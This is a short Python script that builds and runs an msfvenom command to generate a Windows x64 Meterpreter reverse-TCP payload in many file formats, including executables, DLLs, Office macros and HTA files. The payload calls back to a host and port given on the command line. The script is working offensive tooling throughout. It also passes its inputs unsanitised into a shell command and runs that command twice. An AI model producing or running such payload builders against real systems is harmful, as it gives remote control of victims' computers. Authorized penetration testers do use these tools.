import sys
import subprocess
import re

if len(sys.argv) != 4:
    print("Usage: python3 createmsf.py <output_file> <ip_address> <port>")
    sys.exit(1)

output_file = sys.argv[1]
ip_addr = sys.argv[2]
port = sys.argv[3]



def split_from_extension(word):
    if "." in word:
        lead_word, extension = word.split(".")
        return lead_word, extension
    
file_and_extension = split_from_extension(output_file)

if file_and_extension:
    output_file = file_and_extension[0]
    extension = file_and_extension[1]
    



def check_ip(ip):
    ip_pattern = r'^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
    if re.match(ip_pattern, ip):
        return True
    else:
        print(f"Invalid IP Pattern: {ip}")
        return False
    
def check_port(port):
    
    try:
        port_num = int(port)
        if 1 <= port_num <= 65535:
            return True
        else:
            print(f"Invalid Port Number: {port} - Must be between 1 and 65535")
            return False

    except (ValueError, TypeError):
        print(f"Invalid Port Number: {port} - Must be an integer")
        return False
    

check_ip(sys.argv[2])
check_port(sys.argv[3])


if "." in extension:
    extension = extension.replace(".", "")



def create_msf(output_file, extension, ip, port):
    regular_extensions = ['asp', 'aspx', 'aspx-exe', 'axis2', 'dll', 'ducky-script-psh', 'elf', 'elf-so', 'exe', 'exe-only', 'exe-service', 'exe-small', 'hta-psh', 'jar', 'jsp', 'loop-vbs', 'macho', 'msi', 'msi-nouac', 'osx-app', 'psh', 'psh-cmd', 'psh-net', 'psh-reflection', 'python-reflection', 'vba', 'vba-exe', 'vba-psh', 'vbs', 'war']
    if extension not in regular_extensions:
        msf_command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw > {output_file}.{extension}"

    else:
        msf_command = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f {extension} -o {output_file}.{extension}"
    
    
    subprocess.run(msf_command, shell=True, text = False)
    # print(f"A .{extension} file has been created and saved as {output_file}.{extension}")
    try:
        result = subprocess.run(msf_command, 
                          shell=True, 
                          stdout=subprocess.DEVNULL, # Records output to be used later but doesn't display, if you want to dicard totally do subprocess.DEVNULL
                          stderr=subprocess.DEVNULL, # Captures Error to be used later but doesn't display, if you want to dicard totally do subprocess.DEVNULL
                          text=True)
    
    # Check if successful (optional)
        if result.returncode == 0: # Remember response code of successful op is 0 and unsuccessful is 1
            print("File created successfully")
        else:
            print("Error creating file: ", result.stderr)
    except subprocess.SubprocessError as e:
        print(f"Error creating file: {e}")

create_msf(output_file, extension, ip_addr , port)






